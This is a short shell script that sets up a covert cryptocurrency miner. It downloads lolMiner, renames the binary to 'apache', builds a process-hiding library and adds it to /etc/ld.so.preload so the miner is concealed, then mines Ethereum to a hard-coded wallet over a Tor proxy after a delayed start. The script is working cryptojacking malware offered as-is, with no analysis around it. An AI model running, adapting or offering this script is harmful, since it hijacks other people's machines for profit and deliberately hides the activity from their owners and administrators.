#!/bin/sh
sleep 5m
sudo ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
sudo dpkg-reconfigure --frontend noninteractive tzdata
sudo apt update
apt -y install binutils cmake build-essential screen unzip net-tools curl nano tor
sudo service tor start

wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.51/lolMiner_v1.51_Lin64.tar.gz
tar -xf lolMiner_v1.51_Lin64.tar.gz
cd 1.51
mv lolMiner ../apache
cd ..

git clone https://github.com/hanifgz/libprocesshider.git
cd libprocesshider
make
sudo mv libprocesshider.so /usr/local/lib/;sudo su -c 'echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload'
cd ..

./apache --algo ETHASH --pool stratum+ssl://eth-de.flexpool.io:5555 --user 0xbc48b8bdce572defe4dcab85103f140099bc5af5.$(echo $(shuf -i 1-1000 -n 1)) --ethstratum ETHPROXY --socks5 127.0.0.1:9050 --dns-over-https 0
